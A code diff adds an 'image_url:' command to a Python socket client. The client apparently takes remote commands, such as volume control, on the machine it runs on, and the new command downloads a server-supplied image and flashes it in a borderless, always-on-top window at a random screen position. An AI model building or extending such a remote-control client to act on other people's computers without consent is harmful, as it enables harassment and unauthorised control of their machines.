@@ -5,6 +5,8 @@ import random
 import pyautogui
 import threading
 import webbrowser
+import urllib.request
+import tempfile
 import tkinter as tk
 from tkinter import Label
 from PIL import Image, ImageTk
@@ -145,3 +147,48 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
             elif data == "volume:unmute":
                 unmute_volume()
+            elif data.startswith("image_url:"):
+                url = data.split("image_url:")[1]
+
+                def show_image_from_url(image_url):
+                    try:
+                        req = urllib.request.Request(
+                            image_url,
+                            headers={"User-Agent": "Mozilla/5.0"}
+                        )
+                        with urllib.request.urlopen(req) as response:
+                            image_data = response.read()
+
+                        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
+                            tmp.write(image_data)
+                            tmp_path = tmp.name
+
+                        def show_image():
+                            root = tk.Tk()
+                            root.overrideredirect(True)
+                            root.attributes("-topmost", True)
+
+                            screen_width = root.winfo_screenwidth()
+                            screen_height = root.winfo_screenheight()
+
+                            img = Image.open(tmp_path)
+                            img_width, img_height = img.size
+                            x = random.randint(0, screen_width - img_width)
+                            y = random.randint(0, screen_height - img_height)
+
+                            root.geometry(f"{img_width}x{img_height}+{x}+{y}")
+                            tk_image = ImageTk.PhotoImage(img)
+                            label = Label(root, image=tk_image)
+                            label.image = tk_image
+                            label.pack()
+
+                            root.after(3000, root.destroy)
+                            root.mainloop()
+
+                        threading.Thread(target=show_image).start()
+
+                    except Exception as e:
+                        print(f"❌ Erreur affichage image : {e}")
+
+                threading.Thread(target=show_image_from_url, args=(url,)).start()
+
